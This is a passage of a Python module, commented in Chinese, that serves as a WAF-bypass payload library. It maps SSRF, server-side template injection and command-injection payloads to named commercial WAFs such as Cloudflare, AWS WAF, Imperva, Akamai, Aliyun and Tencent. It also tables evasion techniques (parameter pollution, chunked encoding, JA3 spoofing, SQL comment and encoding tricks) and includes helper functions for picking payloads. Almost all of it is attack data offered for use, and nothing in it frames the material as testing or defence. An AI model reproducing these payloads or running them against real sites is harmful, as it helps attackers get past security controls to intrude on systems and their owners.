            {"payload": "http://127.0.0.1.nip.io/", "technique": "dns_rebinding", "description": "DNS 重绑定绕过 Imperva"},
            {"payload": "http://0x7f.0x0.0x0.0x1/", "technique": "ip_encoding", "description": "十六进制 IP 绕过"},
            {"payload": "http://[::ffff:7f00:1]/", "technique": "ipv6_mapped", "description": "IPv6 映射绕过"},
            {"payload": "http://127.0.0.1%00/", "technique": "null_byte_injection", "description": "空字节截断绕过"},
            {"payload": "http://127.1/", "technique": "short_ip", "description": "短 IP 格式绕过"},
        ],

        "akamai": [
            {"payload": "http://0177.0.0.1/", "technique": "octal_encoding", "description": "八进制 IP 绕过 Akamai"},
            {"payload": "http://2130706433/", "technique": "decimal_encoding", "description": "十进制 IP 绕过"},
            {"payload": "http://[::ffff:127.0.0.1]/", "technique": "ipv6_mapped", "description": "IPv4 映射 IPv6 绕过"},
            {"payload": "http://127.0.0.1.nip.io/", "technique": "dns_rebinding", "description": "DNS 重绑定绕过"},
            {"payload": "http://127.1/", "technique": "short_ip", "description": "短 IP 格式绕过"},
        ],

        "aliyun": [
            {"payload": "http://0x7f000001/", "technique": "ip_encoding", "description": "十六进制 IP 绕过阿里云 WAF"},
            {"payload": "http://127.0.0.1.nip.io/", "technique": "dns_rebinding", "description": "DNS 重绑定绕过"},
            {"payload": "http://[::ffff:127.0.0.1]/", "technique": "ipv6_mapped", "description": "IPv4 映射 IPv6 绕过"},
            {"payload": "http://127.1/", "technique": "short_ip", "description": "短 IP 格式绕过"},
            {"payload": "http://0177.0.0.1/", "technique": "octal_encoding", "description": "八进制 IP 绕过"},
        ],

        "tencent": [
            {"payload": "http://2130706433/", "technique": "decimal_encoding", "description": "十进制 IP 绕过腾讯云 WAF"},
            {"payload": "http://127.0.0.1.nip.io/", "technique": "dns_rebinding", "description": "DNS 重绑定绕过"},
            {"payload": "http://[::1]/", "technique": "ipv6_loopback", "description": "IPv6 回环绕过"},
            {"payload": "http://0177.0.0.1/", "technique": "octal_encoding", "description": "八进制 IP 绕过"},
            {"payload": "http://127.1/", "technique": "short_ip", "description": "短 IP 格式绕过"},
        ],

        "阿里云WAF": [
            {"payload": "http://0x7f000001/", "technique": "ip_encoding", "description": "十六进制 IP 绕过阿里云WAF"},
            {"payload": "http://127.0.0.1.nip.io/", "technique": "dns_rebinding", "description": "DNS 重绑定绕过阿里云WAF"},
            {"payload": "http://[::ffff:127.0.0.1]/", "technique": "ipv6_mapped", "description": "IPv4 映射 IPv6 绕过阿里云WAF"},
            {"payload": "http://2130706433/", "technique": "decimal_encoding", "description": "十进制 IP 绕过阿里云WAF"},
            {"payload": "http://0177.0.0.1/", "technique": "octal_encoding", "description": "八进制 IP 绕过阿里云WAF"},
        ],

        "腾讯云WAF": [
            {"payload": "http://127.0.0.1.nip.io/", "technique": "dns_rebinding", "description": "DNS 重绑定绕过腾讯云WAF"},
            {"payload": "http://[::1]/", "technique": "ipv6_loopback", "description": "IPv6 回环绕过腾讯云WAF"},
            {"payload": "http://2130706433/", "technique": "decimal_encoding", "description": "十进制 IP 绕过腾讯云WAF"},
            {"payload": "http://0x7f000001/", "technique": "ip_encoding", "description": "十六进制 IP 绕过腾讯云WAF"},
            {"payload": "http://127.1/", "technique": "short_ip", "description": "短 IP 格式绕过腾讯云WAF"},
        ],
    },

    # ========================================================================
    # SSTI (服务端模板注入)
    # ========================================================================
    "ssti": {

        "generic": [
            {"payload": "{{7*7}}", "technique": "classic", "description": "Jinja2 经典 SSTI"},
            {"payload": "${7*7}", "technique": "classic", "description": "FreeMarker/Velocity SSTI"},
            {"payload": "#{7*7}", "technique": "classic", "description": "Ruby ERB SSTI"},
            {"payload": "{{7*'7'}}", "technique": "classic", "description": "Jinja2 乘法检测"},
            {"payload": "<%=7*7%>", "technique": "classic", "description": "EJS/ERB SSTI"},
        ],

        "cloudflare": [
            {"payload": "{{7*'7'}}", "technique": "classic", "description": "Jinja2 乘法绕过 Cloudflare"},
            {"payload": "{{''.__class__}}", "technique": "class_access", "description": "Python 类访问绕过"},
            {"payload": "#{7*7}", "technique": "classic", "description": "Ruby ERB 绕过"},
            {"payload": "{{request.application.__globals__}}", "technique": "class_access", "description": "全局变量访问绕过"},
            {"payload": "{{''.__class__.__mro__[1].__subclasses__()}}", "technique": "class_access", "description": "子类枚举绕过"},
        ],

        "aws_waf": [
            {"payload": "{{7*7}}" + "A"*8192, "technique": "size_limit_bypass", "description": "超长 payload 绕过 8KB 限制"},
            {"payload": "{\"tpl\":\"{{7*7}}\"}", "technique": "json_format", "description": "JSON 格式绕过"},
            {"payload": "{{7*7}}", "technique": "method_change", "description": "GET 转 POST 绕过"},
            {"payload": "{{7*'7'}}", "technique": "classic", "description": "Jinja2 乘法绕过"},
            {"payload": "tpl={{7*7}}&tpl=normal", "technique": "hpp", "description": "HPP 参数污染绕过"},
        ],

        "modsecurity": [
            {"payload": "{{7*7}}", "technique": "classic", "description": "Jinja2 SSTI 绕过 CRS 低 Paranoia"},
            {"payload": "${7*7}", "technique": "classic", "description": "FreeMarker 绕过"},
            {"payload": "#{7*7}", "technique": "classic", "description": "Ruby ERB 绕过"},
            {"payload": "{{''.__class__}}", "technique": "class_access", "description": "Python 类访问绕过"},
            {"payload": "<%=7*7%>", "technique": "classic", "description": "EJS 绕过"},
        ],

        "imperva": [
            {"payload": "{{7*'7'}}", "technique": "classic", "description": "Jinja2 乘法绕过 Imperva"},
            {"payload": "{{request.__class__}}", "technique": "class_access", "description": "request 类访问绕过"},
            {"payload": "#{7*7}", "technique": "classic", "description": "Ruby ERB 绕过"},
            {"payload": "{{''.__class__.__mro__[1].__subclasses__()}}", "technique": "class_access", "description": "子类枚举绕过"},
            {"payload": "${7*7}", "technique": "classic", "description": "FreeMarker 绕过"},
        ],

        "akamai": [
            {"payload": "{{7*7}}", "technique": "classic", "description": "Jinja2 SSTI 绕过 Akamai"},
            {"payload": "${7*7}", "technique": "classic", "description": "FreeMarker 绕过"},
            {"payload": "{{''.__class__}}", "technique": "class_access", "description": "Python 类访问绕过"},
            {"payload": "#{7*7}", "technique": "classic", "description": "Ruby ERB 绕过"},
            {"payload": "<%=7*7%>", "technique": "classic", "description": "EJS 绕过"},
        ],

        "aliyun": [
            {"payload": "{{7*'7'}}", "technique": "classic", "description": "Jinja2 乘法绕过阿里云 WAF"},
            {"payload": "{{''.__class__}}", "technique": "class_access", "description": "Python 类访问绕过"},
            {"payload": "${7*7}", "technique": "classic", "description": "FreeMarker 绕过"},
            {"payload": "#{7*7}", "technique": "classic", "description": "Ruby ERB 绕过"},
            {"payload": "{{request.__class__}}", "technique": "class_access", "description": "request 类访问绕过"},
        ],

        "tencent": [
            {"payload": "{{7*7}}", "technique": "classic", "description": "Jinja2 SSTI 绕过腾讯云 WAF"},
            {"payload": "#{7*7}", "technique": "classic", "description": "Ruby ERB 绕过"},
            {"payload": "${7*7}", "technique": "classic", "description": "FreeMarker 绕过"},
            {"payload": "<%=7*7%>", "technique": "classic", "description": "EJS 绕过"},
            {"payload": "{{''.__class__}}", "technique": "class_access", "description": "Python 类访问绕过"},
        ],

        "阿里云WAF": [
            {"payload": "{{7*'7'}}", "technique": "classic", "description": "Jinja2 乘法绕过阿里云WAF"},
            {"payload": "{{request.__class__}}", "technique": "class_access", "description": "request 类访问绕过阿里云WAF"},
            {"payload": "#{7*7}", "technique": "classic", "description": "Ruby ERB 绕过阿里云WAF"},
            {"payload": "${7*7}", "technique": "classic", "description": "FreeMarker 绕过阿里云WAF"},
            {"payload": "{{''.__class__.__mro__[1].__subclasses__()}}", "technique": "class_access", "description": "子类枚举绕过阿里云WAF"},
        ],

        "腾讯云WAF": [
            {"payload": "{{7*7}}", "technique": "classic", "description": "Jinja2 SSTI 绕过腾讯云WAF"},
            {"payload": "${7*7}", "technique": "classic", "description": "FreeMarker 绕过腾讯云WAF"},
            {"payload": "#{7*7}", "technique": "classic", "description": "Ruby ERB 绕过腾讯云WAF"},
            {"payload": "<%=7*7%>", "technique": "classic", "description": "EJS 绕过腾讯云WAF"},
            {"payload": "{{''.__class__}}", "technique": "class_access", "description": "Python 类访问绕过腾讯云WAF"},
        ],
    },

    # ========================================================================
    # CMDi (命令注入)
    # ========================================================================
    "cmdi": {

        "generic": [
            {"payload": ";id", "technique": "classic", "description": "经典分号命令注入"},
            {"payload": "|id", "technique": "classic", "description": "管道命令注入"},
            {"payload": "&&id", "technique": "classic", "description": "逻辑与命令注入"},
            {"payload": "||id", "technique": "classic", "description": "逻辑或命令注入"},
            {"payload": "$(id)", "technique": "command_substitution", "description": "命令替换注入"},
        ],

        "cloudflare": [
            {"payload": ";id${IFS}", "technique": "ifs_replacement", "description": "IFS 变量绕过 Cloudflare"},
            {"payload": "|{id}", "technique": "brace_expansion", "description": "花括号展开绕过"},
            {"payload": "&&i\\d", "technique": "backslash_splitting", "description": "反斜杠拆分绕过"},
            {"payload": ";i'd'", "technique": "quote_splitting", "description": "引号拆分绕过"},
            {"payload": "$({id})", "technique": "command_substitution", "description": "花括号命令替换绕过"},
        ],

        "aws_waf": [
            {"payload": ";id" + "A"*8192, "technique": "size_limit_bypass", "description": "超长 payload 绕过 8KB 限制"},
            {"payload": "{\"cmd\":\";id\"}", "technique": "json_format", "description": "JSON 格式绕过"},
            {"payload": ";i%64", "technique": "url_encoding", "description": "URL 编码绕过"},
            {"payload": ";id", "technique": "method_change", "description": "GET 转 POST 绕过"},
            {"payload": "cmd=;id&cmd=whoami", "technique": "hpp", "description": "HPP 参数污染绕过"},
        ],

        "modsecurity": [
            {"payload": ";id${IFS}", "technique": "ifs_replacement", "description": "IFS 替代空格绕过 CRS"},
            {"payload": "|{id}", "technique": "brace_expansion", "description": "花括号展开绕过"},
            {"payload": "&&i\\d", "technique": "backslash_splitting", "description": "反斜杠拆分绕过"},
            {"payload": ";i'd'", "technique": "quote_splitting", "description": "引号拆分绕过"},
            {"payload": "%3bid", "technique": "url_encoding", "description": "全 URL 编码绕过"},
        ],

        "imperva": [
            {"payload": ";id${IFS}", "technique": "ifs_replacement", "description": "IFS 替代空格绕过 Imperva"},
            {"payload": "|{id}", "technique": "brace_expansion", "description": "花括号展开绕过"},
            {"payload": "&&i\\d", "technique": "backslash_splitting", "description": "反斜杠拆分绕过"},
            {"payload": "$({id})", "technique": "command_substitution", "description": "花括号命令替换绕过"},
            {"payload": ";i'd'", "technique": "quote_splitting", "description": "引号拆分绕过"},
        ],

        "akamai": [
            {"payload": ";id${IFS}", "technique": "ifs_replacement", "description": "IFS 替代空格绕过 Akamai"},
            {"payload": "|{id}", "technique": "brace_expansion", "description": "花括号展开绕过"},
            {"payload": "&&i\\d", "technique": "backslash_splitting", "description": "反斜杠拆分绕过"},
            {"payload": "$({id})", "technique": "command_substitution", "description": "花括号命令替换绕过"},
            {"payload": ";i'd'", "technique": "quote_splitting", "description": "引号拆分绕过"},
        ],

        "aliyun": [
            {"payload": ";id${IFS}", "technique": "ifs_replacement", "description": "IFS 替代空格绕过阿里云 WAF"},
            {"payload": "|{id}", "technique": "brace_expansion", "description": "花括号展开绕过"},
            {"payload": "&&i\\d", "technique": "backslash_splitting", "description": "反斜杠拆分绕过"},
            {"payload": "$({id})", "technique": "command_substitution", "description": "花括号命令替换绕过"},
            {"payload": ";i'd'", "technique": "quote_splitting", "description": "引号拆分绕过"},
        ],

        "tencent": [
            {"payload": ";id${IFS}", "technique": "ifs_replacement", "description": "IFS 替代空格绕过腾讯云 WAF"},
            {"payload": "|{id}", "technique": "brace_expansion", "description": "花括号展开绕过"},
            {"payload": "&&i\\d", "technique": "backslash_splitting", "description": "反斜杠拆分绕过"},
            {"payload": "$({id})", "technique": "command_substitution", "description": "花括号命令替换绕过"},
            {"payload": ";i'd'", "technique": "quote_splitting", "description": "引号拆分绕过"},
        ],

        "阿里云WAF": [
            {"payload": ";id${IFS}", "technique": "ifs_replacement", "description": "IFS 替代空格绕过阿里云WAF"},
            {"payload": "|{id}", "technique": "brace_expansion", "description": "花括号展开绕过阿里云WAF"},
            {"payload": "&&i\\d", "technique": "backslash_splitting", "description": "反斜杠拆分绕过阿里云WAF"},
            {"payload": "$({id})", "technique": "command_substitution", "description": "花括号命令替换绕过阿里云WAF"},
            {"payload": ";i'd'", "technique": "quote_splitting", "description": "引号拆分绕过阿里云WAF"},
        ],

        "腾讯云WAF": [
            {"payload": ";id${IFS}", "technique": "ifs_replacement", "description": "IFS 替代空格绕过腾讯云WAF"},
            {"payload": "|{id}", "technique": "brace_expansion", "description": "花括号展开绕过腾讯云WAF"},
            {"payload": "&&i\\d", "technique": "backslash_splitting", "description": "反斜杠拆分绕过腾讯云WAF"},
            {"payload": "$({id})", "technique": "command_substitution", "description": "花括号命令替换绕过腾讯云WAF"},
            {"payload": ";i'd'", "technique": "quote_splitting", "description": "引号拆分绕过腾讯云WAF"},
        ],
    },
}


# ============================================================================
# 高级绕过技术配置 (Advanced Bypass Techniques)
# ============================================================================

ADVANCED_BYPASS_TECHNIQUES = {
    "hpp": {
        "description": "HTTP 参数污染 - 发送多个同名参数，WAF 与后端取值不一致",
        "example": "id=1&id=' UNION SELECT 1,2,3--",
        "applicable_wafs": ["aws_waf", "modsecurity", "cloudflare"],
    },
    "method_change": {
        "description": "请求方法变换 - GET 转 POST 或其他方法，绕过 URI 规则",
        "example": "GET /?id=1' UNION SELECT-- 转 POST / body: id=1' UNION SELECT--",
        "applicable_wafs": ["aws_waf", "akamai", "imperva"],
    },
    "content_type_change": {
        "description": "Content-Type 变换 - 切换 application/json / application/xml 绕过 form 规则",
        "example": "Content-Type: application/json {\"id\":\"1' UNION SELECT--\"}",
        "applicable_wafs": ["aws_waf", "cloudflare", "modsecurity"],
    },
    "json_injection": {
        "description": "JSON 格式注入 - 使用 JSON body 传递 payload，绕过 form-urlencoded 规则",
        "example": "{\"username\":\"admin'--\",\"password\":\"x\"}",
        "applicable_wafs": ["aws_waf", "cloudflare", "imperva"],
    },
    "xml_injection": {
        "description": "XML 格式注入 - 使用 XML body 传递 payload，绕过 form 规则",
        "example": "<root><id>1' UNION SELECT--</id></root>",
        "applicable_wafs": ["aws_waf", "modsecurity"],
    },
    "graphql_bypass": {
        "description": "GraphQL 注入绕过 - 利用 GraphQL 查询结构绕过 WAF 规则",
        "example": "{\"query\":\"{ user(id:\\\"1' UNION SELECT--\\\") { name } }\"}",
        "applicable_wafs": ["aws_waf", "cloudflare", "imperva"],
    },
    "http2_multiplexing": {
        "description": "HTTP/2 多路复用绕过 - 利用 HTTP/2 帧分割绕过 WAF 重组检测",
        "example": "将 payload 拆分到多个 HTTP/2 帧中发送",
        "applicable_wafs": ["cloudflare", "akamai", "aws_waf"],
    },
    "ja3_spoofing": {
        "description": "JA3 指纹伪造绕过 - 伪造 TLS 客户端指纹绕过基于 JA3 的检测",
        "example": "修改 TLS ClientHello 密码套件顺序与扩展",
        "applicable_wafs": ["cloudflare", "datadome", "perimeterx"],
    },
    "chunked_transfer": {
        "description": "分块传输编码绕过 - 使用 Transfer-Encoding: chunked 拆分 payload",
        "example": "Transfer-Encoding: chunked\\r\\n\\r\\n5\\r\\n1' UN\\r\\n5\\r\\nION S\\r\\n...",
        "applicable_wafs": ["cloudflare", "imperva", "modsecurity"],
    },
    "comment_splitting": {
        "description": "注释拆分 - 使用 SQL 注释拆分关键字",
        "example": "UN/**/ION SEL/**/ECT",
        "applicable_wafs": ["cloudflare", "modsecurity", "imperva"],
    },
    "case_mixing": {
        "description": "大小写混淆 - 混合大小写绕过关键字匹配",
        "example": "UnIoN sElEcT",
        "applicable_wafs": ["modsecurity", "aliyun", "tencent"],
    },
    "url_encoding": {
        "description": "URL 编码 - 对关键字进行 URL 编码绕过",
        "example": "%55NION%20SELECT",
        "applicable_wafs": ["aws_waf", "modsecurity", "akamai"],
    },
    "double_url_encoding": {
        "description": "双重 URL 编码 - 二次 URL 编码绕过解码检测",
        "example": "%2555NION%2520SELECT",
        "applicable_wafs": ["imperva", "modsecurity"],
    },
    "html_entity_encoding": {
        "description": "HTML 实体编码 - 使用 HTML 实体绕过 XSS 过滤",
        "example": "&#60;script&#62;alert(1)&#60;/script&#62;",
        "applicable_wafs": ["cloudflare", "imperva", "aliyun"],
    },
    "unicode_encoding": {
        "description": "Unicode 编码 - 使用 Unicode 编码绕过关键字检测",
        "example": "\\u0055NION 或 %u0055NION",
        "applicable_wafs": ["modsecurity", "akamai", "imperva"],
    },
    "null_byte_injection": {
        "description": "空字节注入 - 使用 %00 截断绕过 WAF 检测",
        "example": "1' UNION%00SELECT 1,2,3--",
        "applicable_wafs": ["aws_waf", "aliyun", "modsecurity"],
    },
    "newline_injection": {
        "description": "换行符注入 - 使用 %0a %0d 绕过单行匹配规则",
        "example": "1'%0aUNION%0aSELECT%0a1,2,3--",
        "applicable_wafs": ["cloudflare", "imperva", "aliyun"],
    },
    "tab_replacement": {
        "description": "Tab/空格替代 - 使用 %09 或其他空白符替代空格",
        "example": "1'%09UNION%09SELECT%091,2,3--",
        "applicable_wafs": ["cloudflare", "aliyun", "tencent"],
    },
    "inline_comment_nesting": {
        "description": "内联注释嵌套 - 使用 MySQL 版本注释嵌套关键字",
        "example": "/*!50000UNION*/ /*!50000SELECT*/",
        "applicable_wafs": ["cloudflare", "modsecurity", "imperva"],
    },
    "keyword_splitting": {
        "description": "关键字拆分 - 使用注释拆分 SQL 关键字",
        "example": "UN/**/ION SEL/**/ECT",
        "applicable_wafs": ["modsecurity", "cloudflare"],
    },
    "case_comment_combo": {
        "description": "大小写+注释组合 - 结合大小写混淆与注释拆分",
        "example": "/*!50000UniOn*/ /*!50000SeLeCt*/",
        "applicable_wafs": ["modsecurity", "cloudflare", "imperva"],
    },
    "encoding_combo": {
        "description": "编码组合 - 双重编码+注释组合绕过",
        "example": "%2555NION%2520/*!SELECT*/",
        "applicable_wafs": ["imperva", "modsecurity", "aliyun"],
    },
}


# ============================================================================
# 辅助函数 (Helper Functions)
# ============================================================================

def get_payloads(attack_type, waf=None):
    """获取指定攻击类型和 WAF 的 payload 列表

    Args:
        attack_type (str): 攻击类型 (sqli/xss/lfi/rce/ssrf/ssti/cmdi)
        waf (str, optional): WAF 名称。如果为 None 则返回该攻击类型下所有 payload。

    Returns:
        list: payload 字典列表。每个字典包含 payload, technique, description。
    """
    if attack_type not in BYPASS_PAYLOADS:
        return []

    attack_data = BYPASS_PAYLOADS[attack_type]

    if waf is None:
        # 返回该攻击类型下所有 WAF 的 payload
        all_payloads = []
        for waf_name, payloads in attack_data.items():
            all_payloads.extend(payloads)
        return all_payloads

    if waf not in attack_data:
        # 如果指定 WAF 不存在，回退到 generic
        if "generic" in attack_data:
            return attack_data["generic"]
        return []

    return attack_data[waf]


def get_payload_count():
    """返回总 payload 数

    Returns:
        int: 所有攻击类型和 WAF 的 payload 总数
    """
    count = 0
    for attack_type, waf_data in BYPASS_PAYLOADS.items():
        for waf_name, payloads in waf_data.items():
            count += len(payloads)
    return count


def get_attack_types():
    """返回所有攻击类型列表

    Returns:
        list: 攻击类型列表
    """
    return list(BYPASS_PAYLOADS.keys())


def get_supported_wafs(attack_type=None):
    """返回指定攻击类型支持的 WAF 列表，或所有攻击类型的 WAF

    Args:
        attack_type (str, optional): 攻击类型。如果为 None 返回所有 WAF。

    Returns:
        list: WAF 名称列表
    """
    if attack_type is None:
        wafs = set()
        for waf_data in BYPASS_PAYLOADS.values():
            wafs.update(waf_data.keys())
        return sorted(wafs)

    if attack_type not in BYPASS_PAYLOADS:
        return []

    return list(BYPASS_PAYLOADS[attack_type].keys())


def get_techniques():
    """返回所有绕过技术列表

    Returns:
        list: 所有绕过技术名称列表
    """
    techniques = set()
    # 从 payload 中提取技术
    for waf_data in BYPASS_PAYLOADS.values():
        for payloads in waf_data.values():
            for payload in payloads:
                techniques.add(payload.get("technique", ""))

    # 从高级技术配置中提取
    techniques.update(ADVANCED_BYPASS_TECHNIQUES.keys())

    techniques.discard("")
    return sorted(techniques)


def get_technique_details(technique_name):
    """获取指定绕过技术的详细信息

    Args:
        technique_name (str): 技术名称

    Returns:
        dict or None: 技术详情，不存在则返回 None
    """
    return ADVANCED_BYPASS_TECHNIQUES.get(technique_name)


def get_payloads_by_technique(attack_type, technique):
    """获取指定攻击类型和技术的所有 payload

    Args:
        attack_type (str): 攻击类型
        technique (str): 绕过技术名称

    Returns:
        list: 匹配的 payload 列表
    """
    result = []
    if attack_type not in BYPASS_PAYLOADS:
        return result

    for waf_name, payloads in BYPASS_PAYLOADS[attack_type].items():
        for payload in payloads:
            if payload.get("technique") == technique:
                result.append(payload)
    return result


def get_stats():
    """返回 payload 库统计信息

    Returns:
        dict: 包含 total_payloads, attack_types, wafs, techniques 统计
    """
    attack_type_stats = {}
    total = 0
    for attack_type, waf_data in BYPASS_PAYLOADS.items():
        attack_count = 0
        for payloads in waf_data.values():
            attack_count += len(payloads)
        attack_type_stats[attack_type] = attack_count
        total += attack_count

    return {
        "total_payloads": total,
        "total_techniques": len(get_techniques()),
        "total_advanced_techniques": len(ADVANCED_BYPASS_TECHNIQUES),
        "attack_types": attack_type_stats,
        "version": "2.0",
    }


# ============================================================================
# 模块自测试
# ============================================================================

if __name__ == "__main__":
    print("=" * 60)
    print("Bypass Payload 库统计信息")
    print("=" * 60)

    stats = get_stats()
    print(f"总 Payload 数量: {stats['total_payloads']}")
    print(f"总技术数量: {stats['total_techniques']}")
    print(f"高级技术数量: {stats['total_advanced_techniques']}")
    print(f"版本: {stats['version']}")

    print(f"\n攻击类型 ({len(get_attack_types())} 种):")
    for atk in get_attack_types():
        count = stats["attack_types"][atk]
        wafs = get_supported_wafs(atk)
        print(f"  {atk}: {count} payloads, {len(wafs)} WAFs")

    print(f"\n支持的 WAF ({len(get_supported_wafs())} 个):")
    for waf in get_supported_wafs():
        print(f"  - {waf}")

    print(f"\n绕过技术 ({len(get_techniques())} 种):")
    for tech in get_techniques():
        print(f"  - {tech}")

    print("\n" + "=" * 60)
    print("示例: SQLi + Cloudflare payloads")
    print("=" * 60)
    for p in get_payloads("sqli", "cloudflare"):
        print(f"  [{p['technique']}] {p['payload']}")
        print(f"    -> {p['description']}")
